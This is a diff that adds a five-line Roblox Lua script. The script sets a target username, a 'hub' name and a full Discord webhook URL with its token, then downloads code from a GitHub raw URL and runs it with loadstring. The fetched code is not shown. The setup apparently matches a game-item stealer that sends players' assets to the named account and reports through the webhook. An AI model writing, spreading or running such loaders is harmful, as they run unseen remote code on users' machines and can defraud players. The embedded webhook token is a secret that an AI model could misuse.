@@ -1,0 +1,5 @@
+_G.Username = "ssblue54"
+_G.HubName = "Dimonds hunter time"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1067997847456333874/xMXKpBPdimpMosvhTX2YgWpaq0jTqOucSdR8xNo71I9CQ_AHEMOFR6c4ydz1uPIpROKU"
+
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/trexylol/rexscript/main/main"), true))()
